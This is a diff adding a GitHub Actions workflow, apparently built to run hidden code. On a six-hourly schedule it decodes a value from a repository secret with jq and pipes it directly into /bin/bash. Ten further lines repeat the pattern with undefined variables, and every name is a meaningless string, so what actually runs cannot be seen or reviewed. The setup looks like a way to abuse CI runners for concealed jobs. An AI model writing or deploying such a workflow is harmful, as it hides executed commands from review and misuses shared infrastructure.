@@ -1,0 +1,27 @@
+name: huquanan7890
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huquanan7890
+        env:
+          phwdw2: ${{ secrets.phwdw2 }}
+        run: |
+          echo $phwdw2 | jq -r .ubjd88 | /bin/bash
+          echo $ry130 | jq -r .ewbh73850 | /bin/bash
+          echo $b14 | jq -r .bzh4 | /bin/bash
+          echo $iwvt05003 | jq -r .pylb9 | /bin/bash
+          echo $iuko3 | jq -r .xo6 | /bin/bash
+          echo $mbsg64 | jq -r .s05 | /bin/bash
+          echo $xlad5 | jq -r .zhhv92385 | /bin/bash
+          echo $zrse4 | jq -r .cje46 | /bin/bash
+          echo $js99 | jq -r .px2 | /bin/bash
+          echo $nc79169 | jq -r .bfqlp6936 | /bin/bash
+          echo $snf740 | jq -r .mc95166 | /bin/bash
+
